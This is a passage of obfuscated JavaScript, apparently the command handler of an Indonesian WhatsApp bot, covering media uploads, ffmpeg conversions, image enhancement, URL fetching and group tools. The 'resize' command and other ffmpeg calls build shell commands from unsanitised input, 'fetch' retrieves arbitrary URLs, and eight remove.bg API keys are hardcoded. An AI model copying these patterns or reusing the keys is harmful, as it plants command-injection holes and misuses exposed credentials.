            'buttonParamsJson': "{\n\t\t\t\t\t\t\"title\": \"Pilih Server untuk Upload\",\n\t\t\t\t\t\t\"sections\": [{\n\t\t\t\t\t\t\t\"title\": \"Pilih Server\",\n\t\t\t\t\t\t\t\"rows\": [{\n\t\t\t\t\t\t\t\t\"header\": \"Catbox\",\n\t\t\t\t\t\t\t\t\"title\": \"Mengunggah ke server Catbox! 🐱\",\n\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "uploadcatbox\"\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\"header\": \"8030\",\n\t\t\t\t\t\t\t\t\"title\": \"Mengunggah ke server 8030! 🎞️\",\n\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "uploadfile\"\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\"header\": \"Telegraph\",\n\t\t\t\t\t\t\t\t\"title\": \"Mengunggah ke server Telegraph! 🌐\",\n\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "uploadtelegraph\"\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\"header\": \"Pomf\",\n\t\t\t\t\t\t\t\t\"title\": \"Mengunggah ke server Pomf! 🔥\",\n\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "uploadpomf\"\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\"header\": \"GitHub\",\n\t\t\t\t\t\t\t\t\"title\": \"Mengunggah ke server GitHub! 💻\",\n\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "uploadgithub\"\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\"header\": \"ImgBB\",\n\t\t\t\t\t\t\t\t\"title\": \"Mengunggah ke server ImgBB! 🖼️\",\n\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "uploadimgbb\"\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\"header\": \"TinyURL\",\n\t\t\t\t\t\t\t\t\"title\": \"Mengunggah ke server TinyURL! 🌍\",\n\t\t\t\t\t\t\t\t\"id\": \"" + _0x4773c6 + "uploadtinyurl\"\n\t\t\t\t\t\t\t}]\n\t\t\t\t\t\t}]\n\t\t\t\t\t}"
          }];
          _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x339034, _0x2e9b0b, footer, _0x3f87c6);
        }
        break;
      case "uploadcatbox":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x3df746) {
            return _0x3a091f("Kirim/Reply Video/Gambar Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          await _0x3f87c6.react('⏱️');
          try {
            let _0x284fa6 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            if (/image|video/.test(_0x3df746)) {
              let _0x2f14c2 = await CatBox(_0x284fa6);
              let _0x94469e = (fs.statSync(_0x284fa6).size / 0x400).toFixed(0x2);
              let _0x4974d4 = new Date().toLocaleString();
              let _0x4023e7 = _0x3f87c6.pushName;
              let _0x414873 = ("🔗 *Link Media*: " + _0x2f14c2 + "\n📅 *Tanggal Upload*: " + _0x4974d4 + "\n📂 *Ukuran File*: " + _0x94469e + " KB\n👤 *Pengunggah*: " + _0x4023e7).trim();
              _0x3a091f(_0x414873);
            } else {
              if (!/image/.test(_0x3df746)) {
                let _0x50f679 = await CatBox(_0x284fa6);
                await _0x3a091f(_0x50f679);
              } else {
                _0x3a091f("Jenis media tidak didukung!");
              }
            }
            await fs.unlinkSync(_0x284fa6);
          } catch (_0x5d4528) {
            console.log(_0x5d4528);
            _0x3a091f("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'uploadfile':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f("Fitur ini khusus buat pengguna premium aja, kak! Yuk upgrade sekarang juga biar bisa pakai fitur ini 😊.");
          }
          if (!_0x3df746) {
            return _0x3a091f("Kirim/Reply Video/Gambar Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          await _0x3f87c6.react('⏱️');
          try {
            let _0x2b6a4c = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            if (/image|video/.test(_0x3df746)) {
              let _0x19d4fd = await uploadFile(_0x2b6a4c);
              if (_0x19d4fd) {
                let _0x29bbbe = (fs.statSync(_0x2b6a4c).size / 0x400).toFixed(0x2);
                let _0x1c7d24 = new Date().toLocaleString();
                let _0x11fc17 = _0x3f87c6.sender.replace("@s.whatsapp.net", '');
                let _0x4206cd = ("🔗 *Link Media*: " + _0x19d4fd + "\n📅 *Tanggal Upload*: " + _0x1c7d24 + "\n📂 *Ukuran File*: " + _0x29bbbe + " KB\n👤 *Pengunggah*: @" + _0x11fc17).trim();
                _0x3a091f(_0x4206cd);
              } else {
                _0x3a091f("Gagal mendapatkan URL dari server.");
              }
            } else {
              _0x3a091f("Jenis media tidak didukung!");
            }
            await fs.unlinkSync(_0x2b6a4c);
          } catch (_0x1f198e) {
            console.log(_0x1f198e);
            _0x3a091f("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "toimage":
      case "toimg":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x5dba36) {
            return _0x3a091f("Reply Image");
          }
          if (!/webp/.test(_0x3df746)) {
            return _0x3a091f("Reply sticker dengan caption *" + (_0x4773c6 + _0x4ac520) + '*');
          }
          await _0x3f87c6.react('⏱️');
          let _0x10c083 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          let _0x31c57b = await getRandom('.png');
          exec("ffmpeg -i " + _0x10c083 + " " + _0x31c57b, _0x322415 => {
            fs.unlinkSync(_0x10c083);
            if (_0x322415) {
              throw _0x322415;
            }
            let _0x528aed = fs.readFileSync(_0x31c57b);
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': _0x528aed
            }, {
              'quoted': _0x3f87c6
            });
            fs.unlinkSync(_0x31c57b);
          });
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "imageupscaler":
      case "imageup":
      case "upscale":
      case 'upimg':
      case 'hdr':
      case 'hd':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (_0x3f87c6.sender in enhance) {
            return _0x3a091f("Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.");
          }
          let _0x343069 = _0x3f87c6.quoted ? _0x3f87c6.quoted : _0x3f87c6;
          let _0x3a8438 = (_0x343069.msg || _0x343069).mimetype || _0x343069.mediaType || '';
          if (!_0x3a8438) {
            return _0x3a091f("Kirim/Balas Gambar Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (!/image\/(jpe?g|png)/.test(_0x3a8438)) {
            return _0x3a091f("Media tidak support!");
          }
          enhance[_0x3f87c6.sender] = true;
          try {
            const _0x26b757 = [0x2, 0x4, 0x6];
            await _0x3f87c6.react('⏱️');
            let _0x1e3062 = await _0x343069.download();
            let _0x1d7243 = _0x26b757.includes(parseInt(_0x2b2627)) ? parseInt(_0x2b2627) : 0x2;
            let _0x216edd = '@' + _0x3f87c6.sender.split('@')[0x0];
            let _0x194956 = await upscale(_0x1e3062, _0x1d7243);
            let _0x42cf96 = "🌟 *Effect*: HD\n";
            _0x42cf96 += "📩 *Requested by*: " + _0x216edd + "\n";
            _0x42cf96 += "✨ *Source*: imageupscaler.com\n";
            _0x42cf96 += "🔍 *Skala*: " + _0x1d7243 + "\n";
            _0x42cf96 += "📏 *Available Scales*: " + _0x26b757.join(", ") + "\n\n";
            _0x42cf96 += "Terima kasih sudah menggunakan fitur ini ya, Kak! 😊";
            await _0x3f87c6.react('✅');
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x194956
              },
              'caption': _0x42cf96,
              'mentions': [_0x3f87c6.sender]
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x3e3689) {
            console.error(_0x3e3689);
            _0x3a091f("❌ Ups, terjadi kesalahan saat memproses gambar. Coba lagi nanti ya, Kak!");
          }
          delete enhance[_0x3f87c6.sender];
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "nobg":
      case "imagenobg":
      case 'removebg':
      case "remove-bg":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!/image/.test(_0x3df746)) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (/webp/.test(_0x3df746)) {
            return _0x3a091f("Kirim/Reply Image Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          let _0x139242 = require("remove.bg");
          let _0x2d77b6 = ["pvmbuSzyrip1ksmj9otVSogd", 'jGaBWNXPP8LXV6KW3ovBWozE', "kqWaDsZLxMk2kh9MJu5u7ceP", "kDhVMX7eoByik5hFomEdMDVs", "c7J5ityXePPqxARTMRpohJvj", "xu2pZRhdyddJx48BrN9ntvjD", 'FAKQ7AtfrADtGmLsWVG9s9Yu', "3eoq8Bd1JUxEU3Gi5AAmtxZ1"];
          try {
            let _0x4ec23a = await _0x2d77b6[Math.floor(Math.random() * _0x2d77b6.length)];
            hmm = (await 'remobg-') + getRandom('');
            localFile = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36, hmm);
            outputFile = (await "./temp/hremo-") + getRandom(".png");
            await _0x139242.removeBackgroundFromImageFile({
              'path': localFile,
              'apiKey': _0x4ec23a,
              'size': "regular",
              'type': 'auto',
              'scale': '100%',
              'outputFile': outputFile
            }).then(async _0x55df7b => {
              _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'image': fs.readFileSync(outputFile),
                'caption': mess.done
              }, {
                'quoted': _0x3f87c6
              });
              await fs.unlinkSync(localFile);
              await fs.unlinkSync(outputFile);
            });
          } catch (_0x4e9058) {
            console.log(_0x4e9058);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "resize":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!q) {
            return _0x3a091f("Masukan ukuran panjangxlebar, contoh " + (_0x4773c6 + _0x4ac520) + " 300x300");
          }
          await _0x3f87c6.react('⏳');
          let _0x3074ff = q.split('x')[0x0];
          let _0xa6ab3e = q.split('x')[0x1];
          try {
            let _0x2affc7 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            let _0x16fbda = getRandom('.jpeg');
            exec("ffmpeg -i " + _0x2affc7 + " -vf scale=" + _0x3074ff + ':' + _0xa6ab3e + " " + _0x16fbda, async _0x395aae => {
              fs.unlinkSync(_0x2affc7);
              if (_0x395aae) {
                return _0x3f87c6.reply("Err: " + _0x395aae);
              }
              let _0x418abc = fs.readFileSync(_0x16fbda);
              await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'mimetype': "image/jpeg",
                'image': _0x418abc,
                'caption': mess.done
              }, {
                'quoted': _0x3f87c6
              });
              fs.unlinkSync(_0x16fbda);
            });
          } catch (_0x3d31f5) {
            console.log(_0x3d31f5);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "remini":
      case "enhance":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (_0x3f87c6.sender in enhance) {
            return _0x3a091f("Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.");
          }
          let _0x3ed369 = _0x3f87c6.quoted ? _0x3f87c6.quoted : _0x3f87c6;
          let _0x12e415 = (_0x3ed369.msg || _0x3ed369).mimetype || _0x3ed369.mediaType || '';
          if (!_0x12e415) {
            return _0x3a091f("Kirim/Balas Gambar Dengan Caption " + (_0x4773c6 + _0x4ac520));
          }
          if (!/image\/(jpe?g|png)/.test(_0x12e415)) {
            return _0x3a091f("Media tidak support!");
          }
          enhance[_0x3f87c6.sender] = true;
          const _0x106dba = _0x143458[0x0]?.["toLowerCase"]();
          const _0x35d81a = ["enhance", 'recolor', "dehaze"];
          const _0x3c1e9 = _0x35d81a.includes(_0x106dba) ? _0x106dba : 'enhance';
          _0x3a091f("⏳ Sedang memproses gambar menggunakan metode *" + _0x3c1e9 + "*, harap tunggu...");
          try {
            const _0x48b78c = await _0x59f5fa.downloadMediaMessage(_0x3f87c6.quoted);
            const _0x244366 = await remini(_0x48b78c, _0x3c1e9);
            if (!_0x244366) {
              return _0x3a091f("❌ Gagal memproses gambar. Coba lagi nanti!");
            }
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': _0x244366,
              'caption': "✨ Gambar berhasil ditingkatkan menggunakan metode *" + _0x3c1e9 + '*'
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x104435) {
            console.error(_0x104435);
            _0x3a091f("❌ Terjadi kesalahan saat memproses permintaan. Coba lagi nanti.");
          }
          delete enhance[_0x3f87c6.sender];
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'fetch':
      case 'get':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Yah kak, limitnya udah habis nih 😢. Yuk upgrade ke premium biar bebas pakai fitur ini! ✨");
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627.startsWith("http")) {
            return _0x3a091f("Hmm, Kamu lupa kasih linknya ya? 😅\n\n*Contoh*: " + (_0x4773c6 + _0x4ac520) + " https://www.google.com");
          }
          try {
            const _0x759211 = await axios.get(isUrl(_0x2b2627) ? isUrl(_0x2b2627)[0x0] : _0x2b2627);
            const _0x463cfd = _0x759211.headers["content-type"] || '';
            if (!_0x2cfe7f && !_0x463cfd.includes("text/html")) {
              return _0x3a091f("Ups, konten ini bukan HTML dan Kamu bukan owner ya. Jadi gak bisa akses. 😔");
            }
            return _0x2cfe7f || _0x463cfd.includes("text/html") ? _0x3a091f("Nih kak, hasilnya:\n\n" + util.format(_0x759211.data) + " 😊") : _0x3a091f("Maaf kak, konten ini bukan HTML jadi gak bisa diambil. 😢");
          } catch (_0x1bf216) {
            return _0x3a091f("Aduh, ada error nih kak 😟\n" + util.format(_0x1bf216) + "\nCoba lagi ya!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "toptv":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Yah, limit Kamu udah habis nih 😔. Yuk upgrade ke premium biar limit gak cepet habis! 😊");
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!/video|audio/.test(_0x3df746)) {
            return _0x3a091f("Hmm, Kamu harus balas video atau voice note yang mau dijadikan MP3 ya, jangan lupa pakai caption *" + (_0x4773c6 + _0x4ac520) + "* 😉");
          }
          try {
            let _0x4148eb = {
              'ptvMessage': _0x3f87c6.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage
            };
            _0x59f5fa.relayMessage(_0x3f87c6.chat, _0x4148eb, {});
          } catch (_0x1aa0a7) {
            console.log(_0x1aa0a7);
            _0x3a091f("Aduh, ada yang salah nih kak 😟. Coba lagi ya!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "tovn":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Kak, limitnya udah habis nih 😢. Yuk coba upgrade biar bebas pakai fitur premium! ✨");
          }
          if (!/video/.test(_0x3df746) && !/audio/.test(_0x3df746)) {
            return _0x3a091f("Kak, harus balas video atau VN yang mau dijadikan MP3 ya, jangan lupa pakai caption *" + (_0x4773c6 + _0x4ac520) + "* 😊");
          }
          if (!_0x5dba36) {
            return _0x3a091f("Hmm, pastikan Kamu balas video atau VN dengan caption *" + (_0x4773c6 + _0x4ac520) + "* ya 😉");
          }
          try {
            let _0xd07d49 = await _0x5dba36.download();
            let _0xde40da = await toAudio(_0xd07d49, "mp4");
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'audio': _0xde40da,
              'mimetype': "audio/mp4",
              'ptt': true
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x41826b) {
            console.log(_0x41826b);
            _0x3a091f("Yah, ada error kak 😟. Coba ulang lagi ya, KoKoRey bantu kok!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "tinyurl":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("Yah kak, limitnya udah habis nih 😢. Upgrade ke premium biar bisa terus pakai fitur ini ya! ✨");
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Cara pakainya gampang kok, kak! Ketik: *" + (_0x4773c6 + _0x4ac520) + " link*\n\n*Kirim perintah*: *" + (_0x4773c6 + _0x4ac520) + " https://google.com* 😊");
          }
          if (!isUrl(_0x2b2627)) {
            return _0x3a091f("Hmmm, KoKoRey cuma bisa proses link yang valid ya, kak! Jangan lupa formatnya seperti ini: *" + (_0x4773c6 + _0x4ac520) + " https://google.com* 😉");
          }
          try {
            let _0x578570 = await axios.get("https://tinyurl.com/api-create.php?url=" + _0x2b2627);
            let _0x2974ca = _0x578570.data;
            await _0x3a091f("Tadaaa! Ini link pendeknya, kak: " + _0x2974ca + " 😊");
          } catch (_0x504a20) {
            console.log(_0x504a20);
            _0x3a091f("Aduh, ada error kak 😟. Coba lagi ya, KoKoRey yakin bisa bantu! ✨");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "toaudio":
      case "tomp3":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!/video/.test(_0x3df746) && !/audio/.test(_0x3df746)) {
            return _0x3a091f("Reply Video/VN yang ingin dijadikan MP3 dengan caption " + (_0x4773c6 + _0x4ac520));
          }
          if (!_0x5dba36) {
            return _0x3a091f("Reply Video/VN yang ingin dijadikan MP3 dengan caption " + (_0x4773c6 + _0x4ac520));
          }
          try {
            await _0x3f87c6.react('⏱️');
            let _0x4b27ff = await _0x5dba36.download();
            let _0xcb327d = await toAudio(_0x4b27ff, "mp4");
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'audio': _0xcb327d,
              'mimetype': "audio/mp4"
            }, {
              'quoted': _0x3f87c6
            });
            _0x3a091f("✅ Berhasil mengonversi ke MP3! 🎵");
          } catch (_0x3a9976) {
            console.error("❌ Error:", _0x3a9976);
            _0x3a091f("❌ Gagal mengonversi ke MP3. Cek konsol untuk detailnya.");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "bass":
      case "blown":
      case "deep":
      case "earrape":
      case 'fast':
      case "fat":
      case 'nightcore':
      case 'reverse':
      case "robot":
      case "slow":
      case "smooth":
      case "squirrel":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f("⚠️ Hai kak, limit Kamu habis nih! Yuk, upgrade ke premium biar bisa terus pakai fitur ini. 😊");
          }
          try {
            let _0x308bbd;
            if (/bass/.test(_0x4ac520)) {
              _0x308bbd = "-af equalizer=f=54:width_type=o:width=2:g=20";
            }
            if (/blown/.test(_0x4ac520)) {
              _0x308bbd = "-af acrusher=.1:1:64:0:log";
            }
            if (/deep/.test(_0x4ac520)) {
              _0x308bbd = "-af atempo=4/4,asetrate=44500*2/3";
            }
            if (/earrape/.test(_0x4ac520)) {
              _0x308bbd = "-af volume=12";
            }
            if (/fast/.test(_0x4ac520)) {
              _0x308bbd = "-filter:a \"atempo=1.63,asetrate=44100\"";
            }
            if (/fat/.test(_0x4ac520)) {
              _0x308bbd = "-filter:a \"atempo=1.6,asetrate=22100\"";
            }
            if (/nightcore/.test(_0x4ac520)) {
              _0x308bbd = "-filter:a atempo=1.06,asetrate=44100*1.25";
            }
            if (/reverse/.test(_0x4ac520)) {
              _0x308bbd = "-filter_complex \"areverse\"";
            }
            if (/robot/.test(_0x4ac520)) {
              _0x308bbd = "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
            }
            if (/slow/.test(_0x4ac520)) {
              _0x308bbd = "-filter:a \"atempo=0.7,asetrate=44100\"";
            }
            if (/smooth/.test(_0x4ac520)) {
              _0x308bbd = "-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
            }
            if (/squirrel/.test(_0x4ac520)) {
              _0x308bbd = "-filter:a \"atempo=0.5,asetrate=65100\"";
            }
            if (/audio/.test(_0x3df746)) {
              await _0x3f87c6.react('⏱️');
              let _0x12f70d = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
              let _0x566d0f = getRandom(".mp3");
              exec("ffmpeg -i " + _0x12f70d + " " + _0x308bbd + " " + _0x566d0f, (_0x579201, _0x245af6, _0x4a8056) => {
                fs.unlinkSync(_0x12f70d);
                if (_0x579201) {
                  return _0x3a091f("⚠️ Ups, ada yang salah saat memproses audio. Coba lagi nanti ya, kak! 🙏");
                }
                let _0x3f71a0 = fs.readFileSync(_0x566d0f);
                _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                  'audio': _0x3f71a0,
                  'mimetype': "audio/mp4"
                }, {
                  'quoted': _0x3f87c6
                });
                fs.unlinkSync(_0x566d0f);
                _0x3a091f("✅ Audio berhasil diubah dengan efek *" + _0x4ac520 + "*! Semoga suka ya, kak! 🎶");
              });
            } else {
              _0x3a091f("⚠️ Tolong reply ke audio yang mau diubah dengan caption *" + (_0x4773c6 + _0x4ac520) + "* ya, kak! 🎧");
            }
          } catch (_0x292586) {
            _0x3a091f("⚠️ Ada kesalahan nih, kak: " + _0x292586 + ". Coba lagi nanti ya! 🙏");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "listbadword":
        {
          let _0x2251c0 = "*🌟 Daftar Kata Terlarang 🌟*\n\n";
          _0x2251c0 += bad.map((_0x2ec081, _0x2a4817) => "- " + (_0x2a4817 + 0x1) + ". " + _0x2ec081).join("\n");
          _0x2251c0 += "\n\n✨ Total: *" + bad.length + "* kata";
          _0x3a091f(_0x2251c0);
          break;
        }
      case "afk":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("⚠️ Perintah ini hanya bisa digunakan di grup, ya kak! 😊");
          }
          if (_0x320b7b) {
            return;
          }
          if (_0x103562) {
            return;
          }
          let _0x4df6b9 = _0x2b2627 ? _0x2b2627 : "Nggak ada alasan yang disebutkan~ 🤭";
          addAfkUser(_0x3f87c6.sender, Date.now(), _0x4df6b9, afk);
          let _0x209499 = "🌙 *AFK Mode Aktif!* 🌙\n";
          _0x209499 += "👤 *@" + _0x3f87c6.sender.split('@')[0x0] + "* lagi AFK nih!\n";
          _0x209499 += "💬 *Alasan*: " + _0x4df6b9 + "\n\n";
          _0x209499 += "Jangan lupa balik lagi ya~ KoKoRey kangen nih! 😊✨";
          _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, _0x209499, _0x3f87c6);
          break;
        }
      case 'tagall':
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("Fitur ini hanya bisa digunakan di grup ya, kak!");
          }
          if (!_0x5312e8 && !_0x1397a2 && !_0x2cfe7f) {
            return _0x3a091f("Maaf, kak! Kamu harus jadi admin dulu buat pakai fitur ini.");
          }
          if (!_0x26a295) {
            return _0x3a091f("Aku harus jadi admin dulu untuk menjalankan perintah ini. Tolong jadikan aku admin ya!");
          }
          let _0x3dbca2 = _0x3f87c6.sender;
          let _0x45972e = "🌸 *Tag All Anggota Grup* 🌸\n\n";
          _0x45972e += "📣 *Penanda:* @" + _0x3dbca2.split('@')[0x0] + "\n";
          _0x45972e += "📩 *Pesan:* " + (q ? q : "Tidak ada pesan khusus nih!") + "\n\n";
          for (let _0x2951a7 of _0x1c92e6) {
            _0x45972e += "- @" + _0x2951a7.id.split('@')[0x0] + "\n";
          }
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': _0x45972e,
            'mentions': _0x1c92e6.map(_0x247ccb => _0x247ccb.id)
          }, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case 'h':
      case "hidetag":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x5312e8 && !_0x2cfe7f) {
            return _0x3a091f(mess.admin);
          }
          if (_0x3f87c6.quoted) {
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'forward': _0x3f87c6.quoted.fakeObj,
              'mentions': _0x1c92e6.map(_0x44d1d3 => _0x44d1d3.id)
            });
          }
          if (!_0x3f87c6.quoted) {
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x2b2627 ? _0x2b2627 : '',
              'mentions': _0x1c92e6.map(_0x9c812c => _0x9c812c.id)
            }, {
              'quoted': _0x5a60ae
            });
          }
        }
        break;
      case "delete":
      case 'd':
      case "del":
        {
          if (!_0x5312e8 && !_0x2cfe7f && !_0x256404) {
            return _0x3a091f("Gagal menghapus pesan, hanya owner dan user premium yang dapat menghapus pesan!");
          }
          if (!_0x3f87c6.quoted) {
            return _0x3a091f("Kak, Kamu perlu mengirim pesan yang mau dihapus ya! 🤔");
          }
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'delete': {
              'remoteJid': _0x3f87c6.chat,
              'id': _0x3f87c6.quoted.id,
              'participant': _0x3f87c6.quoted.sender
            }
          });
        }
        break;
      case "autoswview":
      case 'autostatusview':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (_0x143458[0x0] === 'true') {
            autoswview = true;
            await _0x3a091f(mess.done);
          } else if (_0x143458[0x0] === "false") {
            autoswview = false;
            await _0x3a091f(mess.done);
          }
        }
        break;
      case "anticall":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("❗ *Kirim perintah*:\n" + (_0x4773c6 + _0x4ac520) + " true/false");
          }
          if (_0x143458[0x0] === "true") {
            anticall = true;
            await _0x3a091f(mess.done);
          } else if (_0x143458[0x0] === "false") {
            anticall = false;
            await _0x3a091f(mess.done);
          }
        }
        break;
      case "addvideo":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f("⚠️ Perintah ini hanya untuk pemilik bot.");
          }
          if (!q) {
            return _0x3a091f("❓ Nama video belum disebutkan, kak!");
          }
          if (videonye.includes(q)) {
            return _0x3a091f("⚠️ Nama ini sudah ada dalam database.");
          }
          let _0x5255e6 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          videonye.push(q);
          await fsx.copy(_0x5255e6, './media/' + q + ".mp4");
          fs.writeFileSync("./media/database/video.json", JSON.stringify(videonye));
          fs.unlinkSync(_0x5255e6);
          _0x3a091f("✅ Video berhasil ditambahkan ke database!");
          break;
        }
      case "delvideo":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f("⚠️ Perintah ini hanya untuk pemilik bot.");
          }
          if (!q) {
            return _0x3a091f("❓ Nama video yang ingin dihapus belum disebutkan, kak!");
          }
          if (!videonye.includes(q)) {
            return _0x3a091f("⚠️ Nama ini tidak ada dalam database.");
          }
          let _0x52b818 = videonye.indexOf(q);
          videonye.splice(_0x52b818, 0x1);
          fs.writeFileSync('./media/database/video.json', JSON.stringify(videonye));
          fs.unlinkSync("./media/" + q + ".mp4");
          _0x3a091f("✅ Video berhasil dihapus dari database!");
          break;
        }
      case "listvideo":
        {
          let _0x36aa58 = "*🎥 Daftar Video Tersimpan 🎥*\n\n";
          _0x36aa58 += videonye.map((_0x19bdba, _0x8dd1d7) => "- " + (_0x8dd1d7 + 0x1) + ". " + _0x19bdba).join("\n");
          _0x36aa58 += "\n\n✨ Total: *" + videonye.length + "* video.";
          _0x3a091f(_0x36aa58);
          break;
        }
      case "addimage":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f("⚠️ Perintah ini hanya untuk pemilik bot.");
          }
          if (!q) {
            return _0x3a091f("❓ Nama gambar belum disebutkan, kak!");
          }
          if (imagenye.includes(q)) {
            return _0x3a091f("⚠️ Nama ini sudah ada dalam database.");
          }
          let _0x3d8d05 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          imagenye.push(q);
          await fsx.copy(_0x3d8d05, './media/' + q + ".jpg");
          fs.writeFileSync("./media/database/image.json", JSON.stringify(imagenye));
